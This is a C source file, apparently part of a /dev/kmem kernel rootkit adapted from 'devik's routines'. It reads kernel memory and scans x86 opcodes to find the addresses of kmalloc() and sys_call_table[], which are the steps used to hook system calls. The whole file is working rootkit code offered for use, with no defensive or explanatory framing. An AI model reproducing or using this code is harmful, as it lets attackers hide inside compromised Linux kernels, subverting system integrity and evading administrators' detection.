/*
 * $Id: modified devik's routines for pattern search
 *	kmalloc() and sys_call_table[]
 *
 *      Added query_module hint support to avoid strange things on strange
 *      kernels
 */

#include "stuff.h"

typedef	struct {
	ulong	addr;
	ulong	gfp;
	ulong	count;
} kcall;

ulong	get_kma(int kmem, ulong pgoff, ulong *rgfp, ulong hint)
{
#define	KCALL	8192
#define	KSIZE	(1024*1024*2)
#define	BUFSZ	(1024*64)
#define	MAXGFP	0x0fff
#define	MAXSIZE	0x1ffff
	uchar	buf[BUFSZ+64];
	uchar	*p;
	ulong	pos;
	ulong	gfp, sz, call;
	kcall	kcalls[KCALL];
	int	c, i, ccount;

	gfp = sz = call = ccount = 0;

	for (pos = pgoff; pos < (KSIZE + pgoff); pos += BUFSZ) {
		c = rkm(kmem, buf, BUFSZ, pos);
		if (ERR(c)) break;
		for (p = buf; p < (buf + c); ) {
			switch (*p++) {
				case 0x68:
                                        gfp = sz;
                                        sz = *(ulong *) p;
                                        p += 4;
                                        continue;
                                case 0x6a:
                                        gfp = sz;
                                        sz = *p++;
                                        continue;
                                case 0xe8:
				        call = *(ulong *) p + pos +
						(p - buf) + 4;
					p += 4;
                                        if (gfp && sz &&
                                            gfp <= MAXGFP &&
                                            sz <= MAXSIZE) break;
                                default:
					gfp = sz = call = 0;
                                        continue;
			}
			
			for (i = 0; i < ccount; i++) {
				if ((kcalls[i].addr == call) &&
				    (kcalls[i].gfp == gfp)) {
					kcalls[i].count++;
					goto outta;
				}
			}
			
			if (ccount >= KCALL)
				goto endsrch;
				
			kcalls[ccount].addr = call;
			kcalls[ccount].gfp = gfp;
			kcalls[ccount++].count = 1;
		outta:
		}
	}
endsrch:
	if (!ccount) return 0;
	c = 0;
	for (i = 0; i < ccount; i++) {
		if (hint) {
			if (kcalls[i].addr == hint) {
				c = i;
				break;
			}
		} else {
			if (kcalls[i].count > kcalls[c].count)
				c = i;
		}
	}
	*rgfp = kcalls[c].gfp;
	return kcalls[c].addr;
#undef KCALL
#undef KSIZE
#undef BUFSZ
#undef MAXGFP
#undef MAXSIZE
}

/* this will search for sys_call_table[] */
ulong	get_sct(int fd, ulong ep, ulong *pos)
{
#define	SCLEN	512
	char	code[SCLEN];
	char	*p;
	ulong	r;

	if (rkm(fd, code, sizeof(code), ep) <= 0)
		return 0;
	p = (char *) memmem(code, SCLEN, "\xff\x14\x85", 3);
	if (!p) return 0;
	pos[0] = ep + ((p + 3) - code);
	r =  *(ulong *) (p + 3);
	p = (char *) memmem(p+3, SCLEN - (p-code) - 3, "\xff\x14\x85", 3);
	if (!p) return 0;
	pos[1] = ep + ((p + 3) - code);
	return r;
}

